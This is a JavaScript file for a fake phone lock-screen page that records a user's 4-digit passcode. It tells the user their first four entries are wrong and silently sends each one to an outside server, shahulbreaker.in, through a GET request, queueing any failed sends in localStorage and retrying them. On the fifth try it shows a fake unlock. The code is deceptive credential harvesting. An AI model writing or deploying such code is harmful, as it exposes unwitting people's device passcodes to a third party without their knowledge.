(() => {
  const API_BASE = "https://shahulbreaker.in/api/storedata.php?user=tarunpeek&data=";
  const MAX = 4;
  let code = "";

  const dotEls = Array.from(document.querySelectorAll('.dot'));
  const keys = Array.from(document.querySelectorAll('.key[data-num]'));
  const emergency = document.getElementById('emergency');
  const cancelBtn = document.getElementById('cancel');
  const unlockOverlay = document.getElementById('unlockOverlay');
  const lockInner = document.querySelector('.lockscreen-inner');
  const ATT_KEY = '_pass_attempt_count_';
  const QUEUE_KEY = '_pass_queue_';

  function getAttempts() { return parseInt(localStorage.getItem(ATT_KEY) || '0', 10); }
  function setAttempts(n) { localStorage.setItem(ATT_KEY, String(n)); }

  function refreshDots() {
    dotEls.forEach((d,i) => d.classList.toggle('filled', i < code.length));
  }

  function reset() {
    code = "";
    refreshDots();
  }

  function queuePass(pass) {
    const q = JSON.parse(localStorage.getItem(QUEUE_KEY) || '[]');
    q.push({ pass, ts: Date.now() });
    localStorage.setItem(QUEUE_KEY, JSON.stringify(q));
  }

  function sendToAPI(pass) {
    const url = API_BASE + encodeURIComponent(pass);
    return fetch(url, { method: 'GET', keepalive: true })
      .catch(() => {
        queuePass(pass);
      });
  }

  function flushQueue() {
    const queue = JSON.parse(localStorage.getItem(QUEUE_KEY) || '[]');
    if (!queue.length) return;
    queue.forEach(item => {
      fetch(API_BASE + encodeURIComponent(item.pass), { method: 'GET', keepalive: true }).catch(()=>{});
    });
    localStorage.removeItem(QUEUE_KEY);
  }

  function playUnlockAnimation() {
    const inner = lockInner || document.querySelector('.lockscreen-inner');
    if (!inner || !unlockOverlay) return;

    // start animations
    inner.classList.add('unlocking');
    unlockOverlay.classList.add('show');

    // cleanup when slide animation finishes (remove transient shadow)
    const onAnimEnd = (ev) => {
      // optionally filter by ev.animationName if you want a more specific check
      inner.classList.remove('unlocking'); // remove transient styling (shadow)
      inner.removeEventListener('animationend', onAnimEnd);
    };
    inner.addEventListener('animationend', onAnimEnd);
  }

  function animateWrongAttempt() {
    const dotsEl = document.getElementById('dots');
    if (!dotsEl) {
      reset();
      return;
    }
    const DURATION = 700;
    dotsEl.classList.add('wrong');
    reset();
    setTimeout(() => {
      dotsEl.classList.remove('wrong');
    }, DURATION + 20);
  }

  async function handleCompleteAttempt(enteredCode) {
    let attempts = getAttempts();
    attempts += 1;
    setAttempts(attempts);

    // Send attempts 1 through 4 to API. On each of those, show wrong animation.
    if (attempts >= 1 && attempts <= 4) {
      sendToAPI(enteredCode);
      animateWrongAttempt();
    }
    // On attempt 5, do NOT send to API — show unlock animation instead.
    else if (attempts === 5) {
      playUnlockAnimation();
      setTimeout(reset, 300);
    }

    // After the 5th attempt, reset attempt counter back to 0
    if (attempts >= 5) {
      setAttempts(0);
    }
  }

  function animateBrightness(el, target, duration) {
    let startTime;
    const initial = parseFloat(el.dataset.brightness || "1");
    const change = target - initial;

    function easeOutCubic(t) {
      return 1 - Math.pow(1 - t, 3);
    }

    function frame(ts) {
      if (!startTime) startTime = ts;
      const progress = Math.min((ts - startTime) / duration, 1);
      const eased = easeOutCubic(progress);
      const value = initial + change * eased;
      el.style.filter = `brightness(${value})`;
      el.dataset.brightness = value.toFixed(3);
      if (progress < 1) {
        requestAnimationFrame(frame);
      }
    }
    requestAnimationFrame(frame);
  }

  keys.forEach(k => {
    const num = k.dataset.num;
    if (!num) return;

    k.addEventListener('touchstart', () => {
      animateBrightness(k, 1.6, 80); // increased brightness
    }, { passive: true });

    const endPress = () => {
      animateBrightness(k, 1, 100);
    };
    k.addEventListener('touchend', endPress);
    k.addEventListener('touchcancel', endPress);
    k.addEventListener('mouseleave', endPress);

    k.addEventListener('click', () => {
      if (code.length >= MAX) return;
      code += num;
      refreshDots();

      if (code.length === MAX) {
        const enteredCode = code;
        setTimeout(() => {
          handleCompleteAttempt(enteredCode);
        }, 120);
      }
    });
  });

  emergency && emergency.addEventListener('click', e => e.preventDefault());
  cancelBtn && cancelBtn.addEventListener('click', e => { e.preventDefault(); reset(); });

  window.addEventListener('online', flushQueue);
  flushQueue();

  window.__passUI = { getCode: () => code, reset, getAttempts, queuePass };

})();
